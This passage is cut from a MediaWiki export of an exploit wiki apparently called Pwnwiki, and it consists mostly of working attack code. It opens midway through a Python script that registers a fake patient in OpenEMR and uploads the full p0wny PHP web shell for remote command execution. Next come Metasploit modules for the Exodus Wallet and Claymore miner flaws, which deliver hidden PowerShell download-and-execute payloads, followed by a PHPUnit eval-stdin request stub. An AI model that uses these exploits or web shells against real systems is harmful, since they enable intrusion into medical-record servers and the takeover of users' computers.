    'form_guardiansex': '',
    'form_guardianaddress': '',
    'form_guardiancity': '',
    'form_guardianstate': '',
    'form_guardianpostalcode': '',
    'form_guardiancountry': '',
    'form_guardianphone': '',
    'form_guardianworkphone': '',
    'form_guardianemail': '',
    'i1provider': '',
    'i1plan_name': '',
    'i1effective_date': '',
    'i1policy_number': '',
    'i1group_number': '',
    'i1subscriber_employer': '',
    'i1subscriber_employer_street': '',
    'i1subscriber_employer_city': '',
    'form_i1subscriber_employer_state': '',
    'i1subscriber_employer_postal_code': '',
    'form_i1subscriber_employer_country': '',
    'i1subscriber_fname': '',
    'i1subscriber_mname': '',
    'i1subscriber_lname': '',
    'form_i1subscriber_relationship': '',
    'i1subscriber_DOB': '',
    'i1subscriber_ss': '',
    'form_i1subscriber_sex': '',
    'i1subscriber_street': '',
    'i1subscriber_city': '',
    'form_i1subscriber_state': '',
    'i1subscriber_postal_code': '',
    'form_i1subscriber_country': '',
    'i1subscriber_phone': '',
    'i1copay': '',
    'i1accept_assignment': 'TRUE',
    'i2provider': '',
    'i2plan_name': '',
    'i2effective_date': '',
    'i2policy_number': '',
    'i2group_number': '',
    'i2subscriber_employer': '',
    'i2subscriber_employer_street': '',
    'i2subscriber_employer_city': '',
    'form_i2subscriber_employer_state': '',
    'i2subscriber_employer_postal_code': '',
    'form_i2subscriber_employer_country': '',
    'i2subscriber_fname': '',
    'i2subscriber_mname': '',
    'i2subscriber_lname': '',
    'form_i2subscriber_relationship': '',
    'i2subscriber_DOB': '',
    'i2subscriber_ss': '',
    'form_i2subscriber_sex': '',
    'i2subscriber_street': '',
    'i2subscriber_city': '',
    'form_i2subscriber_state': '',
    'i2subscriber_postal_code': '',
    'form_i2subscriber_country': '',
    'i2subscriber_phone': '',
    'i2copay': '',
    'i2accept_assignment': 'TRUE',
    'i3provider': '',
    'i3plan_name': '',
    'i3effective_date': '',
    'i3policy_number': '',
    'i3group_number': '',
    'i3subscriber_employer': '',
    'i3subscriber_employer_street': '',
    'i3subscriber_employer_city': '',
    'form_i3subscriber_employer_state': '',
    'i3subscriber_employer_postal_code': '',
    'form_i3subscriber_employer_country': '',
    'i3subscriber_fname': '',
    'i3subscriber_mname': '',
    'i3subscriber_lname': '',
    'form_i3subscriber_relationship': '',
    'i3subscriber_DOB': '',
    'i3subscriber_ss': '',
    'form_i3subscriber_sex': '',
    'i3subscriber_street': '',
    'i3subscriber_city': '',
    'form_i3subscriber_state': '',
    'i3subscriber_postal_code': '',
    'form_i3subscriber_country': '',
    'i3subscriber_phone': '',
    'i3copay': '',
    'i3accept_assignment': 'TRUE'}

print('')
print('[+] Registering patient:')
x = session.post(url_reg, headers=header, data=body).text

# Get Patient-ID:
id = x[(x.find('pid=')+4):x.find('&amp;')]
print('    [*] ID-NUMBER: ' + id)

# Construct upload URL:
url_upload = 'http://' + target_ip + ':' + target_port + openemr_path + '/controller.php?document&amp;upload&amp;patient_id=' + id + '&amp;parent_id=1&amp;"'

# Header (upload):
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------370797319835249590062969815666",
    "Origin": 'http://' + target_ip,
    "Connection": "close",
    "Referer": url_upload,
    "Upgrade-Insecure-Requests": "1"
}

# Body (shell); I'm using p0wny shell: https://github.com/flozz/p0wny-shell
body = "-----------------------------370797319835249590062969815666\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n64000000\r\n-----------------------------370797319835249590062969815666\r\nContent-Disposition: form-data; name=\"file[]\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------370797319835249590062969815666\r\nContent-Disposition: form-data; name=\"destination\"\r\n\r\n\r\n-----------------------------370797319835249590062969815666\r\nContent-Disposition: form-data; name=\"patient_id\"\r\n\r\n4\r\n-----------------------------370797319835249590062969815666\r\nContent-Disposition: form-data; name=\"category_id\"\r\n\r\n4\r\n-----------------------------370797319835249590062969815666\r\nContent-Disposition: form-data; name=\"process\"\r\n\r\ntrue\r\n-----------------------------370797319835249590062969815666--\r\n"

# Exploit
x = session.post(url_upload, headers=header,data=body).text
print('')
print('[+] Uploading your Webshell')
b = x[x.find('documents/') + 10:]
c = b[:b.find('&lt;')]
webshellpath = 'http://' + target_ip + ':' + target_port + openemr_path + '/sites/default/documents/' + c
print('    [*] Webshell: ' + webshellpath)
print('')
            
&lt;/pre&gt;</text>
      <sha1>n46nxhulws5rysxp3eu7lthhpg6xu65</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-9841 PHPUnit eval-stdin.php 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>2342</id>
    <revision>
      <id>2790</id>
      <timestamp>2021-05-12T01:07:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響== PHPUnit &lt; 5.6.3   ==漏洞利用== 發送以下數據包執行PHP代碼: &lt;pre&gt; POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 Host:  Conten..."</comment>
      <origin>2790</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="245" sha1="pszdq4ddmsx05damh3ehnsgdsqy1f1r" xml:space="preserve">==漏洞影響==
PHPUnit &lt; 5.6.3


==漏洞利用==
發送以下數據包執行PHP代碼:
&lt;pre&gt;
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 
Content-Length: 21
Accept-Encoding: gzip
&lt;/pre&gt;

[[File:Php-1.png | 600px ]]</text>
      <sha1>pszdq4ddmsx05damh3ehnsgdsqy1f1r</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1000006 Exodus Wallet (ElectronJS Framework) 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1223</id>
    <revision>
      <id>1528</id>
      <timestamp>2021-04-11T02:06:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==MSFEXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##   require 'msf/core/..."</comment>
      <origin>1528</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2944" sha1="bgyb7s9j81luo3td50168zmlwkneygk" xml:space="preserve">==MSFEXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core/exploit/powershell'
 
class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ManualRanking
 
  include Msf::Exploit::EXE
  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::HttpServer::HTML
 
  def initialize(info = {})
    super(update_info(info,
      'Name'         =&gt; 'Exodus Wallet (ElectronJS Framework) remote Code Execution',
      'Description'  =&gt; %q(
         This module exploits a Remote Code Execution vulnerability in Exodus Wallet,
         a vulnerability in the ElectronJS Framework protocol handler can be used to
         get arbitrary command execution if the user clicks on a specially crafted URL.
      ),
      'License'      =&gt; MSF_LICENSE,
      'Author'       =&gt;
        [
          'Wflki',          # Original exploit author
          'Daniel Teixeira' # MSF module author
        ],
      'DefaultOptions' =&gt;
        {
          'SRVPORT'    =&gt; '80',
          'URIPATH'    =&gt; '/',
        },
      'References'     =&gt;
        [
          [ 'EDB', '43899' ],
          [ 'BID', '102796' ],
          [ 'CVE', '2018-1000006' ],
        ],
      'Platform'       =&gt; 'win',
      'Targets'        =&gt;
        [
          ['PSH (Binary)', {
            'Platform' =&gt; 'win',
            'Arch' =&gt; [ARCH_X86, ARCH_X64]
          }]
        ],
      'DefaultTarget'  =&gt; 0,
      'DisclosureDate' =&gt; 'Jan 25 2018'
    ))
 
  register_advanced_options(
    [
      OptBool.new('PSH-Proxy', [ true,  'PSH - Use the system proxy', true ]),
    ], self.class
  )
  end
 
  def gen_psh(url)
      ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl
 
      download_string = datastore['PSH-Proxy'] ? (Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)) : (Rex::Powershell::PshMethods.download_and_exec_string(url))
 
      download_and_run = "#{ignore_cert}#{download_string}"
 
      return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)
  end
 
  def serve_payload(cli)
   data = cmd_psh_payload(payload.encoded,
      payload_instance.arch.first,
      remove_comspec: true,
      exec_in_place: true
    )
 
    print_status("Delivering Payload")
    send_response_html(cli, data, 'Content-Type' =&gt; 'application/octet-stream')
  end
 
  def serve_page(cli)
    psh = gen_psh("#{get_uri}payload")
    psh_escaped = psh.gsub("\\","\\\\\\\\").gsub("'","\\\\'")
    val = rand_text_alpha(5)
 
    html = %Q|&lt;html&gt;
&lt;!doctype html&gt;
&lt;script&gt;
  window.location = 'exodus://#{val}" --gpu-launcher="cmd.exe /k #{psh_escaped}" --#{val}='
&lt;/script&gt;
&lt;/html&gt;
|
    send_response_html(cli, html)
  end
 
  def on_request_uri(cli, request)
    case request.uri
    when /payload$/
      serve_payload(cli)
    else
      serve_page(cli)
    end
  end
 
end

&lt;/pre&gt;</text>
      <sha1>bgyb7s9j81luo3td50168zmlwkneygk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1000049 Nanopool Claymore Dual Miner APIs 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1213</id>
    <revision>
      <id>1518</id>
      <timestamp>2021-04-11T01:33:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core/expl..."</comment>
      <origin>1518</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5105" sha1="oa8rcrxtyfoqwhslr8uo9vgpqxgssln" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/powershell'

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'            =&gt; 'Nanopool Claymore Dual Miner APIs RCE',
      'Description'     =&gt; %q{
        This module takes advantage of miner remote manager APIs to exploit an RCE vulnerability.
      },
      'Author'          =&gt;
        [
          'reversebrain@snado', # Vulnerability reporter
          'phra@snado'          # Metasploit module
        ],
      'License'         =&gt; MSF_LICENSE,
      'References'      =&gt;
        [
          ['EDB', '44638'],
          ['CVE', '2018-1000049'],
          ['URL', 'https://reversebrain.github.io/2018/02/01/Claymore-Dual-Miner-Remote-Code-Execution/']
        ],
      'Platform'        =&gt; ['win', 'linux'],
      'Targets'         =&gt;
        [
          [ 'Automatic Target', { 'auto' =&gt; true }],
          [ 'Linux',
            {
              'Platform' =&gt; 'linux',
              'Arch' =&gt; ARCH_X64,
              'CmdStagerFlavor' =&gt; [ 'bourne', 'echo', 'printf' ]
            }
          ],
          [ 'Windows',
            {
              'Platform' =&gt; 'windows',
              'Arch' =&gt; ARCH_X64,
              'CmdStagerFlavor' =&gt; [ 'certutil', 'vbs' ]
            }
          ]
        ],
      'Payload' =&gt;
        {
          'BadChars' =&gt; "\x00"
        },
      'DisclosureDate'  =&gt; 'Feb 09 2018',
      'DefaultTarget'   =&gt; 0))

    register_options(
      [
        OptPort.new('RPORT', [ true, 'Set miner port', 3333 ])
      ])
    deregister_options('URIPATH', 'SSL', 'SSLCert', 'SRVPORT', 'SRVHOST')
  end

  def select_target
    data = {
      "id"      =&gt; 0,
      "jsonrpc" =&gt; '2.0',
      "method"  =&gt; 'miner_getfile',
      "params"  =&gt; ['config.txt']
    }.to_json
    connect
    sock.put(data)
    buf = sock.get_once || ''
    tmp = StringIO.new
    tmp &lt;&lt; buf
    tmp2 = tmp.string
    hex = ''
    if tmp2.scan(/\w+/)[7]
      return self.targets[2]
    elsif tmp2.scan(/\w+/)[5]
      return self.targets[1]
    else
      return nil
    end
  end

  def check
    target = select_target
    if target.nil?
      return Exploit::CheckCode::Safe
    end
    data = {
      "id"      =&gt; 0,
      "jsonrpc" =&gt; '2.0',
      "method"  =&gt; 'miner_getfile',
      "params"  =&gt; ['config.txt']
    }.to_json
    connect
    sock.put(data)
    buf = sock.get_once || ''
    tmp = StringIO.new
    tmp &lt;&lt; buf
    tmp2 = tmp.string
    hex = ''
    case target['Platform']
    when 'linux'
      hex = tmp2.scan(/\w+/)[5]
    when 'windows'
      hex = tmp2.scan(/\w+/)[7]
    end
    str = Rex::Text.hex_to_raw(hex)
    if str.include?('WARNING')
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Detected
    end
  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError =&gt; e
    vprint_error(e.message)
    return Exploit::CheckCode::Unknown
  ensure
    disconnect
  end

  def execute_command(cmd, opts = {})
    target = select_target
    case target['Platform']
    when 'linux'
      cmd = Rex::Text.to_hex(cmd, '')
      upload = {
        "id"      =&gt; 0,
        "jsonrpc" =&gt; '2.0',
        "method"  =&gt; 'miner_file',
        "params"  =&gt; ['reboot.bash', "#{cmd}"]
      }.to_json
    when 'windows'
      cmd = Rex::Text.to_hex(cmd_psh_payload(payload.encoded, payload_instance.arch.first), '')
      upload = {
        "id"      =&gt; 0,
        "jsonrpc" =&gt; '2.0',
        "method"  =&gt; 'miner_file',
        "params"  =&gt; ['reboot.bat', "#{cmd}"]
      }.to_json
    end

    connect
    sock.put(upload)
    buf = sock.get_once || ''
    trigger_vulnerability
  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError =&gt; e
    fail_with(Failure::UnexpectedReply, e.message)
  ensure
    disconnect
  end

  def trigger_vulnerability
    execute = {
      "id"      =&gt; 0,
      "jsonrpc" =&gt; '2.0',
      "method"  =&gt; 'miner_reboot'
    }.to_json
    connect
    sock.put(execute)
    buf = sock.get_once || ''
    disconnect
  end

  def exploit
    target = select_target
    if target.nil?
      fail_with(Failure::NoTarget, 'No matching target')
    end
    if (target['Platform'].eql?('linux') &amp;&amp; payload_instance.name !~ /linux/i) ||
      (target['Platform'].eql?('windows') &amp;&amp; payload_instance.name !~ /windows/i)
      fail_with(Failure::BadConfig, "Selected payload '#{payload_instance.name}' is not compatible with target operating system '#{target.name}'")
    end
    case target['Platform']
    when 'linux'
      execute_cmdstager(flavor: :echo, linemax: 100000)
    when 'windows'
      execute_cmdstager(flavor: :vbs, linemax: 100000)
    end
  end
end

&lt;/pre&gt;</text>
      <sha1>oa8rcrxtyfoqwhslr8uo9vgpqxgssln</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1000110 用戶枚舉漏洞</title>
    <ns>0</ns>
    <id>165</id>
    <revision>
      <id>266</id>
      <timestamp>2021-03-09T08:06:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  &lt;translate&gt; ==漏洞利用== 模糊搜索： &lt;/translate&gt; &lt;pre&gt; http://x.x.x.x:8080/search/?q=a  http://x.x.x.x:8080/search/suggest?query=a  http://x.x.x.x:808..."</comment>
      <origin>266</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="247" sha1="0zt9ko5apjk4cu7qrzcwpupoylkqpto" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞利用==
模糊搜索：
&lt;/translate&gt;
&lt;pre&gt;
http://x.x.x.x:8080/search/?q=a

